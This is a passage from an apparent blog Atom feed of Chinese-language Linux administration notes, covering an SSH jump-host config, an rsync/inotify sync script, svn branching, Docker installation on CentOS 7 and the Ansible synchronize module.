<p>不过如果跳转后 ,如果登陆目标机器用户不是 root 用户, 执行 sudo 的时候会有问题.</p>
<h3 id="windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C"><a href="#windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C" class="headerlink" title="windows 下用 xshell 配置登陆跳转"></a>windows 下用 xshell 配置登陆跳转</h3><p><a href="http://blog.csdn.net/fly542/article/details/7513571" target="_blank" rel="external">xshell 自动登录与自动跳转</a></p>
<p>xshell 实际是配置A登陆到跳板机 B之后自动执行的 登陆到 C 的命令, 区别在于不需要将 A 的公钥放到 C 的authorized_keys中, 而是将 B 登陆 C 用户的公钥放到 C 的 authorized_keys 文件中</p>
<p>参考:</p>
<p><a href="http://mingxinglai.com/cn/2015/07/ssh-proxycommand/" target="_blank" rel="external">SSH穿越跳板机：一条命令跨越跳板机直接登陆远程计算机</a></p>
<p><a href="http://www.cweye.net/2015/07/17/ansible-jumper.html" target="_blank" rel="external">Ansible通过跳板机管理服务器</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="ssh配置"></a>ssh配置</h3><p>有这样的场景, 我们本地的机器 A 需要通过先登录跳板机 B , 然后在 B 上登录目标机器 C, 本文介绍就是通过配置, 实现从 A 直接登录 C .</p>
<p>首先, 将 A 的公钥放到 B , C的 authorized_keys 文件中, 然后确保能从 A免密码登录到 B. 如果看不懂这句, 请先去补习 ssh 通过密钥免密码登录的内容. </p>
<p>在A机的 <code>~/.ssh/config</code> 中配置</p>
<pre><code>host Server_C
user=user_to_C             #这个用户是 B 上登录到 C 的用户
port=22                #这个端口是 B 上登录到 C 的端口
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #本地私钥文件
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # 转发命令, 注意是 A 登录到 B 的用户, IP 和端口
forwardagent yes
</code></pre>]]>
    
    </summary>
    
      <category term="ansible" scheme="http://yoursite.com/tags/ansible/"/>
    
      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 配置 rsync 同步的一个 shell 脚本]]></title>
    <link href="http://yoursite.com/2016/05/03/Centos7-%E9%85%8D%E7%BD%AE-rsync-%E5%90%8C%E6%AD%A5%E7%9A%84%E4%B8%80%E4%B8%AA-shell-%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/05/03/Centos7-配置-rsync-同步的一个-shell-脚本/</id>
    <published>2016-05-03T03:05:54.000Z</published>
    <updated>2016-05-11T10:47:43.000Z</updated>
    <content type="html"><![CDATA[<p>rsync 脚本</p>
<a id="more"></a>
<pre><code>cat /root/shell/set_rsync.sh
#!/bin/bash

# 此脚本用来配置 rsync 服务端

# 定义一些变量

RPATH=/etc/rsyncd.d
CONF=$RPATH/rsyncd.conf
PASSWD_FILE=$RPATH/rsyncd.password
AUTH=$RPATH/rsyncd.secrets

#本机 IP
ADDRESS=192.168.0.2
# 允许访问服务的 IP
ALLOW_IP=192.168.0.3

TAG_NAME=app_upload_files
# 同步目录
RSYNC_DIR=/tmp/app_upload_files
USER=user
PASSWD=&quot;passwd&quot;


# 先创建 rsync 配置存放目录

[ ! -d $RPATH ] &amp;&amp; mkdir $RPATH

# 创建配置文件

[ ! -f $CONF ] &amp;&amp; touch $CONF
[ ! -f $PASSWD_FILE ] &amp;&amp; touch $PASSWD_FILE
[ ! -f $AUTH ] &amp;&amp; touch $AUTH

cat &gt; $CONF &lt;&lt;EOF
#pid文件位置
pid file = /var/run/rsyncd.pid
#监听的端口号
port = 873

#本机ip，请自行修改为自己机器的ip
address = $ADDRESS
#执行账户
uid = nobody
gid = nobody
use chroot = yes
#是否只读
read only = no
#允许访问设置 可以配ip段，也可以多个ip空格间隔，请改为自己允许的ip
#如果客户端不在以下允许列表中，会报 @ERROR: access denied to xxx from unknown 错误
hosts allow= $ALLOW_IP
hosts deny=*
#最大连接数
max connections = 5
motd file = /etc/rsyncd.d/rsyncd.motd
#log文件位置
log file = /var/log/rsync.log
#超时时间
timeout = 300

#配置要同步的目录，可以添加多个
#自定义名称
[$TAG_NAME]
#同步的目录
path = $RSYNC_DIR
#排除的文件
#exclude from = /etc/rsyncd.d/xxx_exclude_list
list=yes
ignore errors
#认证用户名称
auth users = $USER
#用户认证文件，见接下的第2条
secrets file = /etc/rsyncd.d/rsyncd.secrets
EOF

chmod 600 $CONF
mv /etc/rsyncd.conf{,.bak}
ln -s  $CONF  /etc/rsyncd.conf

echo $PASSWD &gt; $PASSWD_FILE
chmod 600 $PASSWD_FILE

echo &quot;$USER:$PASSWD&quot; &gt; $AUTH
chmod 600 $AUTH


# 启动服务
systemctl enable rsyncd.service
systemctl restart rsyncd.service
systemctl status rsyncd.service

# 执行完脚本后, 还需自行配置防火墙端口 873
</code></pre><p>两台机器都执行这个脚本</p>
<p>然后可以用拉的方式同步:</p>
<pre><code>/usr/bin/rsync -avzP --delete user@server1::app_upload_files /tmp/app_upload_files/ --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>如果用推的方式:</p>
<pre><code>/usr/bin/rsync -avzP /tmp/app_upload_files/ user@server1::app_upload_files --password-file=/etc/rsyncd.d/rsyncd.password
</code></pre><p>注意<code>/tmp/app_upload_files/</code> 如果改成<code>/tmp/app_upload_files</code> (末尾少了斜杠) 推送过去目录结构会变成<code>/tmp/app_upload_files/app_upload_files</code>, 如果提示<code>Permission denied</code>, 则推送目标端的 rsync 配置文件需要把 gid,uid 改成 root</p>
<p>结合 inotfy 脚本进行实时同步, 则必须用推的方式, 因为是监控本地变化, 发生变化推送到远端</p>
<p>inotify 脚本:</p>
<pre><code>cat /etc/rsyncd.d/inotify-rsync.sh
#!/bin/bash

# 此脚本用来监控 源目录文件夹的变化, 跟目标机器进行rsync同步

set -e
#源目录
SRC=/tmp/app_upload_files/
#目标服务器ip
TARGET=192.168.0.3
#rsync 用户
USER=hdruser
#rsync tag
TAG=app_upload_files
# 密码文件
PASSWD=/etc/rsyncd.d/rsyncd.password

#modify,delete,create,attrib这些为监听的动作，比如如果不要delete，那么删除的动作就不会触发同步
/bin/inotifywait -mrq --timefmt &apos;%d/%m/%y %H:%M&apos; --format &apos;%T %w%f%e&apos; -e modify,delete,create,attrib $SRC | while read files
do
/usr/bin/rsync -vzrtopgq  --progress --password-file=$PASSWD $SRC $USER@$TARGET::$TAG
done

# 运行方式, 给脚本赋予执行权限, 然后用后台的方式运行: nohup /etc/rsyncd.d/inotify-rsync.sh &amp;
# 加到开机启动项: echo &quot;/etc/rsyncd.d/inotify-rsync.sh &amp;&quot; &gt;&gt; /etc/rc.local
</code></pre><p>注意:</p>
<p>nohup /etc/rsyncd.d/inotify-rsync.sh &amp; 这个脚本, 当 rsync 报错的时候, 就会自动退出</p>
<p>如果rsync 开启delete 参数, 在同步失败之后, 需要备份一下文件再恢复同步, 否则可能造成数据丢失</p>
<p>参考:</p>
<p><a href="http://xxling.com/blog/article/2093.aspx" target="_blank" rel="external">CentOS7通过rsync和inotify进行实时同步</a></p>
<p><a href="https://segmentfault.com/a/1190000002558330" target="_blank" rel="external">关于rsync+inotify-tools实时同步模式</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>rsync 脚本</p>]]>
    
    </summary>
    
      <category term="Centos 7" scheme="http://yoursite.com/tags/Centos-7/"/>
    
      <category term="rsync" scheme="http://yoursite.com/tags/rsync/"/>
    
      <category term="shell" scheme="http://yoursite.com/tags/shell/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn 版本控制命令]]></title>
    <link href="http://yoursite.com/2016/04/26/svn-%E7%89%88%E6%9C%AC%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/"/>
    <id>http://yoursite.com/2016/04/26/svn-版本控制命令/</id>
    <published>2016-04-26T10:20:04.000Z</published>
    <updated>2016-04-26T12:19:29.000Z</updated>
    <content type="html"><![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout 特定版本"></a>checkout 特定版本</h3><pre><code>svn checkout &lt;svn地址&gt; -r  &lt;版本号&gt;
</code></pre><h3 id="u521B_u5EFA_u5206_u652F"><a href="#u521B_u5EFA_u5206_u652F" class="headerlink" title="创建分支"></a>创建分支</h3><pre><code>$ svn copy svn://test.evergrande.cn/test/trunk svn://test.evergrande.cn/test/branches/TRY-something -m &apos;make branches TRY-something&apos;
Committing transaction...
Committed revision 7.
</code></pre><p>必须要有trunk和 branches 目录</p>
<p>参考: </p>
<p><a href="http://blog.163.com/yang_jianli/blog/static/1619900062010101233015365/" target="_blank" rel="external">svn 选择指定版本</a></p>
<p><a href="http://xstarcd.github.io/wiki/sysadmin/svn_branch_tag_command.html" target="_blank" rel="external">svn命令行创建和删除分支和tags</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="checkout__u7279_u5B9A_u7248_u672C"><a href="#checkout__u7279_u5B9A_u7248_u672C" class="headerlink" title="checkout 特定版本"></a>checkou]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Docker 部署Gitlab]]></title>
    <link href="http://yoursite.com/2016/04/22/Docker-%E9%83%A8%E7%BD%B2Gitlab/"/>
    <id>http://yoursite.com/2016/04/22/Docker-部署Gitlab/</id>
    <published>2016-04-22T09:38:07.000Z</published>
    <updated>2016-05-11T07:40:47.000Z</updated>
    <content type="html"><![CDATA[<p>环境: 阿里云 centos7镜像, 已经安装了 docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external">(docker 安装详情)</a></p>
<p>参考:</p>
<p><a href="https://github.com/sameersbn/docker-gitlab#installation" target="_blank" rel="external">sameersbn/gitlab:8.6.6</a></p>
<p><a href="http://www.cnphp6.com/archives/99594" target="_blank" rel="external">使用DOCKER搭建GITLAB实践</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>环境: 阿里云 centos7镜像, 已经安装了 docker <a href="http://www.a-ho.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/" target="_blank" rel="external]]>
    </summary>
    
      <category term="Docker" scheme="http://yoursite.com/tags/Docker/"/>
    
      <category term="Gitlab" scheme="http://yoursite.com/tags/Gitlab/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 安装Docker]]></title>
    <link href="http://yoursite.com/2016/04/22/Centos-7-%E5%AE%89%E8%A3%85Docker/"/>
    <id>http://yoursite.com/2016/04/22/Centos-7-安装Docker/</id>
    <published>2016-04-22T06:31:15.000Z</published>
    <updated>2016-05-11T07:34:37.000Z</updated>
    <content type="html"><![CDATA[<p>环境:阿里云 centos7 镜像</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><p>1.查看内核版本, 如果内核太旧, 请升级到最新版本</p>
<pre><code># uname -r
3.10.0-327.13.1.el7.x86_64

# yum update -y
</code></pre><p>2.官方脚本安装</p>
<pre><code># curl -fsSL https://get.docker.com/ | sh
+ sh -c &apos;sleep 3; yum -y -q install docker-engine&apos;
warning: /var/cache/yum/x86_64/7/docker-main-repo/packages/docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm: Header V4 RSA/SHA512 Signature, key ID 2c52609d: NOKEY
Public key for docker-engine-selinux-1.11.0-1.el7.centos.noarch.rpm is not installed
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3000 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: [Errno 12] Timeout on https://yum.dockerproject.org/repo/main/centos/7/Packages/docker-engine-1.11.0-1.el7.centos.x86_64.rpm: (28, &apos;Operation timed out after 3001 milliseconds with 0 out of 0 bytes received&apos;)
Trying other mirror.
Importing GPG key 0x2C52609D:
 Userid     : &quot;Docker Release Tool (releasedocker) &lt;docker@docker.com&gt;&quot;
 Fingerprint: 5811 8e89 f3a9 1289 7c07 0adb f762 2157 2c52 609d
 From       : https://yum.dockerproject.org/gpg
setsebool:  SELinux is disabled.

If you would like to use Docker as a non-root user, you should now consider
adding your user to the &quot;docker&quot; group with something like:

  sudo usermod -aG docker your-user

Remember that you will have to log out and back in for this to take effect!
</code></pre><p>3.启动</p>
<pre><code>service docker start
</code></pre><p>4.测试</p>
<pre><code># docker run hello-world
Unable to find image &apos;hello-world:latest&apos; locally
latest: Pulling from library/hello-world
03f4658f8b78: Pull complete
a3ed95caeb02: Pull complete
Digest: sha256:8be990ef2aeb16dbcb9271ddfe2610fa6658d13f6dfb8bc72074cc1ca36966a7
Status: Downloaded newer image for hello-world:latest

Hello from Docker.
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the &quot;hello-world&quot; image from the Docker Hub.
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker Hub account:
 https://hub.docker.com

For more examples and ideas, visit:
 https://docs.docker.com/userguide/
</code></pre><p>5.设置开机启动</p>
<pre><code># chkconfig docker on
Note: Forwarding request to &apos;systemctl enable docker.service&apos;.
Created symlink from /etc/systemd/system/multi-user.target.wants/docker.service to /usr/lib/systemd/system/docker.service.
</code></pre><h3 id="u5378_u8F7D"><a href="#u5378_u8F7D" class="headerlink" title="卸载"></a>卸载</h3><pre><code>yum list installed | grep docker
docker-engine.x86_64               1.11.0-1.el7.centos        @docker-main-repo
docker-engine-selinux.noarch       1.11.0-1.el7.centos        @docker-main-repo

yum -y remove docker-engine.x86_64

rm -rf /var/lib/docker
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<p>环境:阿里云 centos7 镜像</p>
<h3 id="u5B89_u88C5"><a href="#u5B89_u88C5" class="headerlink" title="安装"></a>安装</h3><p>1.查看内核版本, 如果内核太旧, 请升级到最新版本<]]>
    </summary>
    
      <category term="docker" scheme="http://yoursite.com/tags/docker/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Ansible synchronize]]></title>
    <link href="http://yoursite.com/2016/04/20/Ansible-synchronize/"/>
    <id>http://yoursite.com/2016/04/20/Ansible-synchronize/</id>
    <published>2016-04-20T12:00:58.000Z</published>
    <updated>2016-04-22T03:53:38.000Z</updated>
    <content type="html"><![CDATA[<p>注意几个参数,[default: no]或者有特殊配置的:</p>
<ul>
<li>copy_links    拷贝软连接的真实文件, 而不是软连接</li>
<li>delete    在进行同步后是否删除 src 中不存在的文件, 默认情况下, 是会保留 dest 目标文件夹原先就存在的文件</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]本地或者委托到目标机</li>
</ul>
<a id="more"></a>
<h3 id="ansible-doc"><a href="#ansible-doc" class="headerlink" title="ansible-doc"></a>ansible-doc</h3><figure class="highlight vbnet"><table><tr><td class="code"><pre><span class="line">&gt; SYNCHRONIZE</span><br><span class="line"></span><br><span class="line">  This <span class="keyword">is</span> a wrapper around rsync. <span class="keyword">Of</span> course you could just use the</span><br><span class="line">  command action <span class="keyword">to</span> <span class="keyword">call</span> rsync yourself, but you also have <span class="keyword">to</span> add a</span><br><span class="line">  fair number <span class="keyword">of</span> boilerplate options <span class="keyword">and</span> host facts. You still may</span><br><span class="line">  need <span class="keyword">to</span> <span class="keyword">call</span> rsync directly via `command<span class="comment">' or `shell' depending on</span></span><br><span class="line">  your use <span class="keyword">case</span>. The synchronize action <span class="keyword">is</span> meant <span class="keyword">to</span> <span class="keyword">do</span> common things</span><br><span class="line">  <span class="keyword">with</span> `rsync<span class="comment">' easily. It does not provide access to the full power of</span></span><br><span class="line">  rsync, but does make most invocations easier <span class="keyword">to</span> follow.</span><br><span class="line"></span><br><span class="line">Options (= <span class="keyword">is</span> mandatory):</span><br><span class="line"></span><br><span class="line">- archive</span><br><span class="line">        Mirrors the rsync archive flag, enables recursive, links,</span><br><span class="line">        perms, times, owner, <span class="keyword">group</span> flags <span class="keyword">and</span> -D. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- checksum</span><br><span class="line">        <span class="keyword">Skip</span> based <span class="keyword">on</span> checksum, rather than <span class="keyword">mod</span>-time &amp; size; Note that</span><br><span class="line">        that <span class="string">"archive"</span> <span class="keyword">option</span> <span class="keyword">is</span> still enabled <span class="keyword">by</span> <span class="keyword">default</span> - the</span><br><span class="line">        <span class="string">"checksum"</span> <span class="keyword">option</span> will <span class="keyword">not</span> disable it. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- compress</span><br><span class="line">        Compress file data during the transfer. <span class="keyword">In</span> most cases, leave</span><br><span class="line">        this enabled unless it causes problems. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: yes]</span><br><span class="line"></span><br><span class="line">- copy_links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> the item that they point <span class="keyword">to</span> (the referent) <span class="keyword">is</span></span><br><span class="line">        copied, rather than the symlink. (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        no]</span><br><span class="line"></span><br><span class="line">- delete</span><br><span class="line">        Delete files that don<span class="comment">'t exist (after transfer, not before) in</span></span><br><span class="line">        the `src<span class="comment">' path. This option requires `recursive=yes'.</span></span><br><span class="line">        (Choices: yes, no) [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">= dest</span><br><span class="line">        Path <span class="keyword">on</span> the destination machine that will be synchronized <span class="keyword">from</span></span><br><span class="line">        the source; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- dest_port</span><br><span class="line">        Port number <span class="keyword">for</span> ssh <span class="keyword">on</span> the destination host. The</span><br><span class="line">        ansible_ssh_port inventory var takes precedence over this</span><br><span class="line">        value. [<span class="keyword">Default</span>: <span class="number">22</span>]</span><br><span class="line"></span><br><span class="line">- dirs</span><br><span class="line">        Transfer directories without recursing (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- existing_only</span><br><span class="line">        <span class="keyword">Skip</span> creating <span class="keyword">new</span> files <span class="keyword">on</span> receiver. (Choices: yes, no)</span><br><span class="line">        [<span class="keyword">Default</span>: no]</span><br><span class="line"></span><br><span class="line">- <span class="keyword">group</span></span><br><span class="line">        <span class="keyword">Preserve</span> <span class="keyword">group</span> (Choices: yes, no) [<span class="keyword">Default</span>: the value <span class="keyword">of</span> the</span><br><span class="line">        archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- links</span><br><span class="line">        Copy symlinks <span class="keyword">as</span> symlinks. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- mode</span><br><span class="line">        Specify the direction <span class="keyword">of</span> the synchronization. <span class="keyword">In</span> push mode the</span><br><span class="line">        localhost <span class="keyword">or</span> <span class="keyword">delegate</span> <span class="keyword">is</span> the source; <span class="keyword">In</span> pull mode the remote</span><br><span class="line">        host <span class="keyword">in</span> context <span class="keyword">is</span> the source. (Choices: push, pull) [<span class="keyword">Default</span>:</span><br><span class="line">        push]</span><br><span class="line"></span><br><span class="line">- owner</span><br><span class="line">        <span class="keyword">Preserve</span> owner (super user only) (Choices: yes, no) [<span class="keyword">Default</span>:</span><br><span class="line">        the value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- perms</span><br><span class="line">        <span class="keyword">Preserve</span> permissions. (Choices: yes, no) [<span class="keyword">Default</span>: the value</span><br><span class="line">        <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- recursive</span><br><span class="line">        Recurse <span class="keyword">into</span> directories. (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">- rsync_opts</span><br><span class="line">        Specify additional rsync options <span class="keyword">by</span> passing <span class="keyword">in</span> an array.</span><br><span class="line">        [<span class="keyword">Default</span>: None]</span><br><span class="line"></span><br><span class="line">- rsync_path</span><br><span class="line">        Specify the rsync command <span class="keyword">to</span> run <span class="keyword">on</span> the remote machine. See</span><br><span class="line">        `--rsync-path<span class="comment">' on the rsync man page.</span></span><br><span class="line"></span><br><span class="line">- rsync_timeout</span><br><span class="line">        Specify a --timeout <span class="keyword">for</span> the rsync command <span class="keyword">in</span> seconds.</span><br><span class="line">        [<span class="keyword">Default</span>: <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">- set_remote_user</span><br><span class="line">        put user@ <span class="keyword">for</span> the remote paths. <span class="keyword">If</span> you have a <span class="keyword">custom</span> ssh</span><br><span class="line">        config <span class="keyword">to</span> define the remote user <span class="keyword">for</span> a host that does <span class="keyword">not</span></span><br><span class="line">        match the inventory user, you should <span class="keyword">set</span> this parameter <span class="keyword">to</span></span><br><span class="line">        <span class="string">"no"</span>. [<span class="keyword">Default</span>: <span class="literal">True</span>]</span><br><span class="line"></span><br><span class="line">= src</span><br><span class="line">        Path <span class="keyword">on</span> the source machine that will be synchronized <span class="keyword">to</span> the</span><br><span class="line">        destination; The path can be absolute <span class="keyword">or</span> relative.</span><br><span class="line"></span><br><span class="line">- times</span><br><span class="line">        <span class="keyword">Preserve</span> modification times (Choices: yes, no) [<span class="keyword">Default</span>: the</span><br><span class="line">        value <span class="keyword">of</span> the archive <span class="keyword">option</span>]</span><br><span class="line"></span><br><span class="line">Notes:  rsync must be installed <span class="keyword">on</span> both the local <span class="keyword">and</span> remote machine.</span><br><span class="line">        Inspect the verbose output <span class="keyword">to</span> validate the destination</span><br><span class="line">        user/host/path are what was expected. The remote user <span class="keyword">for</span> the</span><br><span class="line">        dest path will always be the remote_user, <span class="keyword">not</span> the sudo_user.</span><br><span class="line">        Expect that dest=~/x will be ~&lt;remote_user&gt;/x even <span class="keyword">if</span> <span class="keyword">using</span></span><br><span class="line">        sudo. <span class="keyword">To</span> exclude files <span class="keyword">and</span> directories <span class="keyword">from</span> being</span><br><span class="line">        synchronized, you may add `.rsync-filter<span class="comment">' files to the source</span></span><br><span class="line">        directory.</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">EXAMPLES:</span><br><span class="line"># Synchronization of src on the control machine to dest on the remote hosts</span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path</span><br><span class="line"></span><br><span class="line"># Synchronization without any <span class="comment">--archive options enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path archive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --recursive</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path recursive=no</span><br><span class="line"></span><br><span class="line"># Synchronization with <span class="comment">--archive options enabled except for --times, with --checksum option enabled</span></span><br><span class="line">synchronize: src=some/relative/path dest=/some/absolute/path <span class="operator"><span class="keyword">checksum</span>=yes times=<span class="keyword">no</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">without</span> <span class="comment">--archive options enabled except use --links</span></span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">archive</span>=<span class="keyword">no</span> links=yes</span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> two paths <span class="keyword">both</span> <span class="keyword">on</span> the control machine</span><br><span class="line">local_action: synchronize src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> the inventory host <span class="keyword">to</span> the dest <span class="keyword">on</span> the localhost <span class="keyword">in</span></span><br><span class="line">pull <span class="keyword">mode</span></span><br><span class="line">synchronize: <span class="keyword">mode</span>=pull src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line"></span><br><span class="line"># Synchronization <span class="keyword">of</span> src <span class="keyword">on</span> <span class="keyword">delegate</span> host <span class="keyword">to</span> dest <span class="keyword">on</span> the <span class="keyword">current</span> inventory host.</span><br><span class="line"># <span class="keyword">If</span> delegate_to <span class="keyword">is</span> <span class="keyword">set</span> <span class="keyword">to</span> the <span class="keyword">current</span> inventory host, this can be used <span class="keyword">to</span> syncronize</span><br><span class="line"># two directories <span class="keyword">on</span> that host. </span><br><span class="line">synchronize: &gt;</span><br><span class="line">    src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span></span><br><span class="line">    delegate_to: <span class="keyword">delegate</span>.host</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">and</span> <span class="keyword">delete</span> files <span class="keyword">in</span> dest <span class="keyword">on</span> the remote host that <span class="keyword">are</span> <span class="keyword">not</span> <span class="keyword">found</span> <span class="keyword">in</span> src <span class="keyword">of</span> localhost.</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> <span class="keyword">delete</span>=yes</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">using</span> an alternate rsync command</span><br><span class="line">synchronize: src=<span class="keyword">some</span>/<span class="keyword">relative</span>/<span class="keyword">path</span> dest=/<span class="keyword">some</span>/<span class="keyword">absolute</span>/<span class="keyword">path</span> rsync_path=<span class="string">"sudo rsync"</span></span><br><span class="line"></span><br><span class="line"># Example .rsync-filter <span class="keyword">file</span> <span class="keyword">in</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">- <span class="keyword">var</span>       # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> whose <span class="keyword">last</span> part <span class="keyword">is</span> <span class="string">'var'</span></span><br><span class="line">- /<span class="keyword">var</span>      # <span class="keyword">exclude</span> <span class="keyword">any</span> <span class="keyword">path</span> <span class="keyword">starting</span> <span class="keyword">with</span> <span class="string">'var'</span> <span class="keyword">starting</span> <span class="keyword">at</span> the <span class="keyword">source</span> <span class="keyword">directory</span></span><br><span class="line">+ /<span class="keyword">var</span>/conf # <span class="keyword">include</span> /<span class="keyword">var</span>/conf even though it was previously excluded</span><br><span class="line"></span><br><span class="line"># Synchronize <span class="keyword">passing</span> <span class="keyword">in</span> extra rsync options</span><br><span class="line">synchronize: src=/tmp/helloworld dest=/<span class="keyword">var</span>/www/helloword rsync_opts=<span class="comment">--no-motd,--exclude=.git</span></span></span><br></pre></td></tr></table></figure>
<h3 id="u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65"><a href="#u7528_u6765_u505A_u751F_u4EA7_u73AF_u5883_beta__u73AF_u5883_u540C_u6B65" class="headerlink" title="用来做生产环境 beta 环境同步"></a>用来做生产环境 beta 环境同步</h3><p>同步 nginx 主目录下的配置, 除了 vhost 配置目录不同步</p>
<p>一个坑:</p>
<pre><code>synchronize: src=~/Documents/eg/svn/everinner_app_beta/config_app dest=/opt/www
</code></pre><p>这个相当于把<code>config_app</code>目录拷贝到<code>/opt/www</code>下, 拷贝后变成<code>/opt/www/config_app</code>, 如果 写成<code>dest=/opt/www/config_app</code>, 拷贝后会变成<code>/opt/www/config_app/config_app</code></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>注意几个参数,[default: no]或者有特殊配置的:</p>
<ul>
<li>copy_links    拷贝软连接的真实文件, 而不是软连接</li>
<li>delete    在进行同步后是否删除 src 中不存在的文件, 默认情况下, 是会保留 dest 目标文件夹原先就存在的文件</li>
<li>existing_only    ?</li>
<li>mode      [ default: push ]本地或者委托到目标机</li>
</ul>]]>
    
    </summary>
    
      <category term="Ansible" scheme="http://yoursite.com/tags/Ansible/"/>
    
      <category term="Synchronize" scheme="http://yoursite.com/tags/Synchronize/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
</feed>
